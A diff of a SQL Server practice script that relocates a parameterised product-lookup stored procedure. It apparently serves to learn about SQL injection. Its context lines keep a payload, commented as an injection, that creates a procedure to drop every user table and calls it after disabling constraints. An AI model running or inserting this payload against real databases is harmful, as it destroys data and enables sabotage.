@@ -1,26 +1,3 @@
--- Create store procedure to get product by name
-ALTER PROCEDURE sp_GetProductByName
-    @name AS VARCHAR(MAX)
-AS
-BEGIN
-	IF EXISTS(SELECT TOP (1) * FROM dbo.Products WHERE Name = @name)
-	BEGIN
-		SELECT Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice,
-               Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit,
-               SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated,
-               DateModified, Status 
-		FROM dbo.Products 
-		WHERE Name = @name;	
-	END	
-	ELSE
-	BEGIN
-	    RETURN;
-	END
-
-END
-GO
-
-EXEC sp_GetProductByName 'product 1'
 
 -- Check Columns
 /*Wrong */ 
@@ -71,3 +48,31 @@ GO
 -- Inject query to drop all table 
 CREATE PROCEDURE DROPALLTABLE @sql NVARCHAR(max)= '' AS BEGIN SELECT @sql += ' Drop table ' + QUOTENAME(s.NAME) + '.' + QUOTENAME(t.NAME) + '; ' FROM sys.tables t JOIN sys.schemas s ON t.[schema_id] = s.[schema_id] WHERE  t.type = 'U' PRINT @sql Exec sp_executesql @sql END; -- 
 SELECT * FROM dbo.HackTable; EXEC DROPALLTABLE 'EXEC sp_msforeachtable "ALTER TABLE ? NOCHECK CONSTRAINT all";';--
+GO
+
+
+
+
+-- Create store procedure to get product by name
+ALTER PROCEDURE sp_GetProductByName
+    @name AS VARCHAR(MAX)
+AS
+BEGIN
+	IF EXISTS(SELECT TOP (1) * FROM dbo.Products WHERE Name = @name)
+	BEGIN
+		SELECT Id, Name, CategoryId, Image, Price, PromotionPrice, OriginalPrice,
+               Description, Content, HomeFlag, HotFlag, ViewCount, Tags, Unit,
+               SeoPageTitle, SeoAlias, SeoKeywords, SeoDescription, DateCreated,
+               DateModified, Status 
+		FROM dbo.Products 
+		WHERE Name = @name;	
+	END	
+	ELSE
+	BEGIN
+	    RETURN;
+	END
+
+END
+GO
+
+EXEC sp_GetProductByName 'product 1'
